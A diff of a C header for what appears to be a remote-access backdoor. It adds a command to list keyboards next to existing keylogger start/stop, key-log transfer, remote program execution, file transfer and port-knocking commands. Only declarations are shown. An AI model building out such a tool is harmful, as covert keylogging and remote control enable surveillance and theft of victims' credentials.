@@ -15,6 +15,7 @@ struct server_options;
 enum command_codes {
     START_KEYLOGGER = 0x01,
     STOP_KEYLOGGER,
+    GET_KEYBOARDS,
     KEY_LOG_TRANSFER,
     SEND_FILE,
     FILENAME,
@@ -67,6 +68,7 @@ void process_run_command(struct session_info * session_info);
 void process_receive_file(struct session_info * session_info);
 void process_send_file(struct session_info * session_info);
 void handle_response(struct session_info * session_info);
+void handle_get_keyboards(struct session_info * session_info);
 void handle_disconnect(struct session_info * session_info);
 
 //  Map of command codes and handler functions
@@ -75,6 +77,7 @@ static const key_pair command_handler_functions[] = {
     { STOP_KEYLOGGER, stop_keylogger },
     { RUN_PROGRAM, process_run_command },
     { SEND_FILE, process_send_file },
+    { GET_KEYBOARDS, handle_get_keyboards },
     { RECEIVE_FILE, process_receive_file },
     { DISCONNECT, handle_disconnect },
     { RESPONSE, handle_response },
@@ -84,8 +87,9 @@ static const key_pair command_handler_functions[] = {
 void initiate_port_knocking(const struct server_options * server_options);
 
 // Keylogger
-void send_start_keylogger(int fd);
-void send_stop_keylogger(int fd);
+void send_start_keylogger(struct server_options * server_options);
+void send_get_keyboards(struct server_options * server_options);
+void send_stop_keylogger(struct server_options * server_options);
 
 // Disconnect
 void send_disconnect(struct server_options * server_options);
